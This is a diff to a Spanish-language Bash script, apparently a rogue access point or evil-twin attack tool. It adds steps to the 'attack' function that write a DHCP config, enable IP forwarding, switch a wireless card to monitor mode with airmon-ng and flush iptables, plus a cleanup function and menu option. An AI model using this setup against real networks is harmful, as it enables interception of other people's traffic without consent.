@@ -24,6 +24,41 @@ attack()
 	echo "option domain-name-servers 8.8.8.8;" >> /etc/dhcpd.conf
 	echo "range 192.168.1.130 192.168.1.140;" >> /etc/dhcpd.conf
 	echo "}" >> /etc/dhcpd.conf
+
+	sleep 1 && echo -e "\n${yellowColour}Habilitando enrutamiento en el equipo...${endColour}" && sleep 1
+
+	echo 1 > /proc/sys/net/ipv4/ip_forward
+
+	sleep 1 && echo -ne "\n${yellowColour}Interfaz a poner en modo monitor [$endColour${blueColour}$(ifconfig | cut -d ' ' -f 1 | xargs | tr -d ':' | tr ' ' ',')${endColour}$yellowColour]:${endColour} " && tput cnorm
+	read interface && tput civis
+
+	echo -e "\n${yellowColour}Configurando${endColour}${blueColour} $interface$endColour${yellowColour} en modo monitor...${endColour}" && sleep 1
+
+	airmon-ng start $interface > /dev/null 2>&1
+
+	sleep 1 && echo -e "\n${yellowColour}Limpiando reglas iptables...${endColour}" && sleep 1
+
+	iptables --flush && iptables --table nat --flush
+	iptables --delete-chain && iptables --table nat --delete-chain
+
+
+}
+
+cleaner()
+{
+	echo 0 > /proc/sys/net/ipv4/ip_forward
+
+	iptables --flush && iptables --table nat --flush && iptables --delete-chain && iptables --table nat --delete-chain
+
+	rm -r /etc/dhcpd.conf 2>/dev/null
+	rm -r /var/run/dhcpd.pid 2>/dev/null
+
+	if [ "$interface" ]; then
+		airmon-ng stop ${interface}mon > /dev/null 2>&1
+	fi
+
+	ifconfig at0 down 2>/dev/null
+	service network-manager restart
 }
 
 menu()
@@ -36,7 +71,7 @@ menu()
 	echo -e "╱╰━┻╯╰━━┻━━┻━┻╯╰╯╰┻━━╯$endColour" && sleep 0.06
 	echo -e "$redColour-----------------------$endColour" & sleep 1
 	echo -e "${blueColour}1) ${endColour}${grayColour}Iniciar ataque${endColour}" && sleep 0.06
-	echo -e "${blueColour}2) ${endColour}${grayColour}Realizar una limpieza${endColour}" && sleep 0.06
+	echo -e "${blueColour}2) ${endColour}${grayColour}Reiniciar configuración${endColour}" && sleep 0.06
 	echo -e "${blueColour}0) ${endColour}${grayColour}Salir del programa${endColour}" && sleep 0.06
 	echo -e "$redColour-------------------------$endColour" & sleep 1
 	echo -ne "${yellowColour}Selecciona una opción:${endColour} " && tput cnorm
@@ -53,6 +88,10 @@ if [ "$(id -u)" -eq "0" ]; then
 
 		1) attack
 			;;
+
+		2) cleaner
+			;;
+
 		0) exit
 			;;
 
